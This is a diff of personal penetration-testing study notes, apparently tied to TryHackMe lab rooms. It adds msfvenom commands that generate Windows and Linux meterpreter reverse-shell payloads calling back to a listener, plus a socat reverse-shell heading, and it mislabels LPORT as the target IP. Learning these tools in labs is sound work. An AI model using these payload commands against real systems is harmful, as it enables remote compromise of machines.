@@ -181,17 +181,22 @@ Eternal Blue exploit
 
 ---
 
-## msfvenom create payloads
+# msfvenom create payloads
+
+search for payloads
+`msfvenom --list payloads | grep "linux/x86/meterpreter"
 
 ```
 msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 ```
-
 - -p    creates payload
 - windows/x64/shell/reverse_tcp     reverse shell for a x86 WIndows Target
 - -f    prints to .exe format
 - lhost     listen IP
 - lport     target IP
+
+generates a staged meterpreter reverse shell for a 64bit Linux target, own IP=10.10.10.5, listening on port 443? The format for the shell is `elf` and the output filename should be "shell"
+`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
 
 >***Encoders*** do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload.
 
@@ -247,6 +252,8 @@ Meterpreter [CheatSheet](https://scadahacker.com/library/Documents/Cheat_Sheets/
 
 
 # socat
+
+https://tryhackme.com/room/introtoshells
 
 ## Reverse Shell
 
